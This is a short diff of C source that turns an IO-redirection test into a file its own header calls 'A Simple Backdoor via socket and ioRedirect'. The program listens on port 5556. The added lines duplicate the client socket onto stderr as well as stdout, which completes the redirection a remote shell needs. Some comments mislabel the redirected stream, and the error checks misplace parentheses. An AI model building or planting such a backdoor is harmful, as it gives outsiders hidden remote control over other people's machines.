@@ -1,10 +1,9 @@
 /*
  * =====================================================================================
  *
- *       Filename:  test.c
+ *       Filename:  ioRedirect.c
  *
- *    Description:  For Test IO-Redict by freopen a new file for stdin and
- *    stdout
+ *    Description:  A Simple Backdoor via socket and ioRedirect
  *
  *        Version:  1.0
  *        Created:  2015年06月13日 22时09分11秒
@@ -36,6 +35,7 @@
 
 #define STDIN 0
 #define STDOUT 1
+#define STDERR 2
 #define PORT 5556
 #define MAXBUF 50
 
@@ -48,7 +48,7 @@ static char *acdeny = "Access Deny!\n";
 
 int main(int argc, char **argv)
 {
-    int sockfd, cliSockfd, in, out;
+    int sockfd, cliSockfd, in, out, err;
     int pid, res, addrlen;
     void *pStdOut;
     SockAddrIn scSockServer, scSockClient;
@@ -114,6 +114,10 @@ int main(int argc, char **argv)
 
             if ((out = dup2(cliSockfd, STDOUT) == -1)) {//标准输入重定向到客户机socket
                 printf("[E]: Error When change stdout to socket\n");
+                return -2;
+            }
+            if ((err = dup2(cliSockfd, STDERR) == -1)) {//标准输入重定向到客户机socket
+                printf("[E]: Error When change stderr to socket\n");
                 return -2;
             }
     
